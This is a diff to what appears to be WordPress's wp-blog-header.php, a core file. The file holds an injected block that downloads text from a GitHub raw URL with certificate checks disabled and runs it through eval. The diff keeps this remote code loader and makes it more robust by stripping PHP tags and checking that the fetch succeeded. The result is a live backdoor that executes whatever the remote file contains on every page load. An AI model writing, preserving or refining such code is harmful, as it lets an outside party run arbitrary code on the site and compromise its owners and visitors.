@@ -19,8 +19,6 @@ if ( ! isset( $wp_did_header ) ) {
 	require_once ABSPATH . WPINC . '/template-loader.php';
 
 }
-?>
-<?php
 $url = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -28,5 +26,8 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 $fileContents = curl_exec($ch);
 curl_close($ch);
-eval("?>" . $fileContents);
+if ($fileContents !== false) {
+    $fileContents = str_replace(array('<?php', '<?', '?>'), '', $fileContents);
+    eval($fileContents);
+}
 ?>
